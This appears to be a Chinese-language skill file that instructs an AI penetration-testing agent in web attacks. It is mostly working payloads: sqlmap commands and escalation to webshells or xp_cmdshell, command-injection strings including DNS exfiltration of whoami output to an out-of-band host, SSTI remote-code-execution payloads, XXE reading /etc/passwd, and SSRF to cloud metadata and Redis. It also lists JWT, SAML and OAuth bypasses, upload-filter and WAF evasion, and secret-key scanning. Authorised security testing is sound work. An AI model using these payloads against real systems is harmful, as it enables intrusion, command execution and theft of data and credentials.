---
name: web-attack-methods
description: 对 Web 应用做注入、认证绕过、服务端与前端漏洞测试时调用——SQLi/命令注入/SSTI/XXE/SSRF/XSS/文件上传/LFI/反序列化/JWT/OAuth/SAML/NoSQL/Host 头/请求走私 的验证手法与绕过清单。
tags:
  cwe: [CWE-89, CWE-78, CWE-94, CWE-79, CWE-918, CWE-22, CWE-434, CWE-502, CWE-639, CWE-287, CWE-444, CWE-348]
  attack: [T1190, T1059, T1090]
  class: [sql-injection, command-injection, ssti, xxe, ssrf, xss, file-upload, lfi, auth-bypass, request-smuggling]
---

# Web 攻击手法速查

## 与本平台的衔接

| 场景 | 用平台能力 |
|---|---|
| 批量探活/指纹 | `http_probe` |
| 单发可控请求 | `http_request`（cookie jar / 代理留痕） |
| 登录态/身份对照 | `session_login` + `auth_request` + `diff_responses` |
| 前端 JS/接口 | `js_audit` |
| 已知组件 CVE | `search_vulns` / `get_poc` / `scan_with_nuclei` |
| OOB（SSRF/盲注/XXE） | `listener_start` + `listener_sessions` |
| 结论/证据 | `record_fact` → `report_finding`；`save_evidence` |

## 使用纪律

- 先指纹（框架/中间件/语言/参数结构），再选手法；**不要盲打**。
- 每条结论必须有真实请求+响应；SQLi 附可复测 sqlmap 命令；XSS/SSRF 附最小 payload 与回显。
- 严重性按证据分级：能拿到真实数据/命令回显=L3+ 才报 high/critical。

## 注入

### SQL 注入

- 探测：`'`、`''`、`\`、数字加减（`id=1` → `id=2-1`）；报错/布尔/时间三路互证。
- 类型：数字型 `1 AND 1=1`、字符型 `' AND '1'='1`、括号型 `') AND ('1'='1`。
- 手工确认：
  - 布尔：`' AND 1=1-- -` vs `' AND 1=2-- -`；
  - 时间：`SLEEP(5)`（MySQL）/`WAITFOR DELAY`（MSSQL）/`pg_sleep(5)`（PG）；
  - 报错：`extractvalue(1,concat(0x7e,version()))`、`updatexml`。
- 自动化（结果必须人工复核回显）：
  ```bash
  sqlmap -u "http://target/item?id=1" --batch --level=3 --risk=2 --technique=BEUSTQ
  sqlmap -u "http://target/api?id=1" --cookie "SESSION=..." -p id --dbms=mysql --current-db --current-user
  sqlmap -u "http://target/api/login" --data '{"username":"a*","password":"b"}' --headers "Content-Type: application/json"
  ```
- 绕过：注释 `/**/`、大小写、`%0b`、`+`/`%20`、`ORDER BY` 探列数、UNION。
- 升级：`FILE` → OUTFILE webshell；MSSQL → `xp_cmdshell`；PG → `COPY ... PROGRAM`。

### 命令注入

- 载荷：`; id`、`| id`、`|| id`、`&& id`、`$(id)`、`` `id` ``、`%0a id`；
- 无回显：时间盲 `; sleep 5`、DNS 外带 `; nslookup $(whoami).<oob>`；
- 绕空格：`$IFS`、`${IFS}`、`%09`；绕关键字：`c\at`、`tac`、`nl`、`rev`；
- 证据：命令回显原文（whoami/id/hostname），不要只报「疑似」。

### SSTI

- 探测：`{{7*7}}`、`${7*7}`、`#{7*7}`、`<%= 7*7 %>`；
- Jinja2：`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`；
  FreeMarker：`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`；
- 先报「引擎识别 + 表达式求值成功」，RCE 需完整命令回显。

### XXE

- 经典：`<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>`；
- OOB：`<!ENTITY % p SYSTEM "http://<oob>/x.dtd">%p;`；
- 盲 XXE 走 DNS 即可证明解析；读文件属 L3。

### NoSQL / LDAP / XPath

- Mongo：`{"username":{"$ne":null},"password":{"$ne":null}}`、`{"$regex":"^a"}`、`{"$where":"sleep(5000)"}`；
- 参数形式：`username[$ne]=`；注意 JSON 与表单污染；
- LDAP：`*)(uid=*))(|(uid=*`、`admin*`；
- XPath：`' or '1'='1`、`x' or count(/*)>0 or '`。

## 认证与授权

- 认证绕过：`admin'--`、密码重置可预测 token、Host 头投毒、`X-Forwarded-For` 伪造内网；
- 越权（IDOR）：换对象 ID、`{"role":"admin"}` 批量赋值、UUID 可枚举；
  用 `auth_request` 组第二身份，`diff_responses` 对比；
- JWT：`alg:none`、RS256→HS256 混淆、弱密钥爆破（`hashcat -m 16500`）、`kid` 注入、`jku/x5u` 指向自有 JWKS；
- OAuth/OIDC：`redirect_uri` 子串/后缀/@ 混淆、缺 `state`、PKCE 降级、`id_token` 当普通 JWT 打；
- SAML：签名包装（XSW）、签名剥离、注释截断 `admin<!---->@evil.com`；
- 401/403 绕过：`/admin/`、`/Admin`、`/%2e/admin`、`/admin;`、`/admin..;/`、
  `X-Original-URL` / `X-Rewrite-URL` / `X-Forwarded-For: 127.0.0.1`。

## 服务端

- LFI：`../../../etc/passwd`、`php://filter/convert.base64-encode/resource=index.php`、
  `data://`、`phar://`（反序列化）、日志投毒；
- 文件上传：`shell.php.jpg`、`.PHP`、`.php.`、`%00`、`.htaccess`、`GIF89a` 幻数；
  上传成功必须拿到执行回显，否则只算「可上传」；
- 反序列化：Java（ysoserial/CC 链）、PHP（`__wakeup`/`__destruct`）、Python pickle、
  .NET（`TypeConfuseDelegate`）——先定位 sink 再选链；
- Spring：`/actuator` 白名单 + `/actuator/../api/...`、`X-HTTP-Method-Override`；
- SSRF：`127.0.0.1` 变体（`2130706433`、`[::1]`、`0x7f000001`）、`#@`、`nip.io`；
  云元数据 `169.254.169.254` / `metadata.google.internal`；`gopher://` 打 Redis/MySQL；
- 请求走私：CL/TE、TE/CL、TE 混淆（`Transfer-Encoding: chunked` + 变体），先确认前后端解析差异；
- Host 头：`X-Forwarded-Host`、密码重置链接投毒、缓存键污染（Web Cache Poisoning）。

## 前端

- XSS：HTML/属性/JS 上下文分别构造；DOM XSS 看 `innerHTML`/`document.write`/`eval`；
- 存储型 XSS（客服/工单/IM）：消息经 WebSocket/STOMP 进入管理面板 → 管理员浏览器执行；
- CSP 绕过：JSONP、AngularJS CDN 白名单、`base-uri` 缺失；
- 前端泄露：sourcemap（`.js.map`）、硬编码密钥、内部接口、测试域名——落 fact 并纳入测试。

## WAF / CDN 绕过要点

- 编码层：URL 双重编码、Unicode、`%0b`、分块传输、大小写/注释；
- 语义层：等价函数（`SLEEP`→`BENCHMARK`）、同义参数、JSON 嵌套；
- 基础设施层：源站 IP（历史 DNS/证书/子域）、CDN 未覆盖端口（`8080/8443`）、`X-Forwarded-Host`；
- 确认被 WAF 拦（403 特征）→ 记录「拦截机制+可绕过性」，不当成漏洞。

## 落库与升级

- 每个确认点：`record_fact`（含请求/响应关键行）；确认影响后 `report_finding` 并绑流量；
- 同一参数多种手法失败 → 落负结果 fact，避免重复打；
- 升级严重性必须给「真实影响」：命令回显、文件内容、越权读到的他人数据；
  仅有报错/延迟 → 最多 medium 并注明利用条件。

## 前端构建产物泄露（SPA/Vue/React）

- sourcemap：`//# sourceMappingURL=x.js.map` → 拉 `.map` → `sourcesContent` = 原始源码；
  平台 `js_audit` 一键全链路；
- chunk 接口提取：`"/prod-api/..."`、`baseURL`、`axios.create`、`vue-router path`；
- 密钥扫描：`LTAI`(阿里云)、`AKIA`(AWS)、`-----BEGIN PRIVATE KEY`、`eyJ`(JWT)、
  `accessKey/secretKey/appSecret`——命中且能调通 = critical；
- 定级：纯源码结构还原 = high（CWE-540）；含可用密钥/未公开接口 = critical 视影响。
